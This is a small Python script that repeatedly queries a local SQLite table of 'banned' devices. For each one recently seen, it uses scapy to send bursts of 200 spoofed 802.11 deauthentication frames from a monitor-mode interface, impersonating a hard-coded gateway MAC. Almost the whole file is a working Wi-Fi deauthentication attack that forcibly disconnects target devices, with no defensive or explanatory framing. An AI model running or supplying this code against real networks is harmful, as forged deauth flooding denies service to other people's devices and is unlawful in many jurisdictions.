import os
import pyshark
import sqlite3
from datetime import datetime
import json
from scapy.all import *
import subprocess
from time import sleep



while True:

    # print("===============================================================================")
    # print("Consultando base de datos...")


    # connect to a db in sqllite3 and get all devices
    conn = sqlite3.connect('espresso.db')

    cursor = conn.cursor()
    time_up = (datetime.now() - timedelta(hours=0, minutes=1)).strftime("%Y-%m-%d %H:%M:%S")

    # get all devices in devices_blacklist that are up and banned
    cursor.execute("SELECT * FROM devices WHERE is_banned = 1 and last_up_detected > ?",( time_up,))
    

    devices_up_and_banned = cursor.fetchall()

    conn.close()
    # print("===============================================================================")

    if len(devices_up_and_banned) == 0:
        # print("No devices up and banned")
        pass
        
    else:
        for device in devices_up_and_banned:
            # print(f"Device {device[1]}|{device[2]} is up")
        
            print(f"> Device is in the network: {device[1]} | {device[2]}")

            target_mac = device[1]
            gateway_mac = "00:CB:51:5F:34:E6"

            dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
            packet = RadioTap()/dot11/Dot11Deauth(reason=7)
            # send the packet
            sendp(packet, inter=0.1, count=200, iface="wlan0mon", verbose=1)
        
    sleep(20)






